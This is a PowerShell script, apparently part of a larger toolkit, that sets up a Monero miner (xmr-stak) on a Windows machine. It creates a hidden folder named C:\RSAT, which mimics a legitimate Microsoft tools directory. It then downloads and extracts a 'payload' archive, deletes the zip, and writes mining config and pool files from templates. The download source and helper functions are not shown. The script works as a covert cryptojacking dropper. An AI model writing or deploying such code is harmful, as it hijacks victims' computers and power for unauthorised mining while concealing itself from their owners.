Import-Module "${psscriptroot}\APFunctions.psm1"

# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1

$opsDirectory = "C:\RSAT"

if (!(Test-Path $opsDirectory))
{
    mkdir $opsDirectory
	$f = Get-Item $opsDirectory -Force
	$f.Attributes = "Hidden"
}

# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.

$payloadDestination = "$opsDirectory\payload.zip"

if (!(Test-Path "$opsDirectory\xmr-stak-win64")) 

{

payload $payloadDestination
Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
Remove-Item $payloadDestination

}


# Load the newly unzipped directory path into a variable and set the destiation path to extract the config.

$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
$stakDir = "$opsDirectory\$unzipDir"

# Check to see if a config.txt file exists - download the template and modify as needed if it doesn't

if (!(Test-Path "$stakDir\config.txt"))

{

	stripExcess (configTpl) | Out-File "$stakDir\config.txt"
	alterConfigTpl "$stakDir\config.txt"

}

# Check for a pools.txt file - download the template and modify as needed if it doesn't

if (!(Test-Path "$stakDir\pools.txt"))

{
	
	stripExcess (poolTpl) | Out-File "$stakDir\pools.txt"
	alterPoolTpl "$stakDir\pools.txt"

}
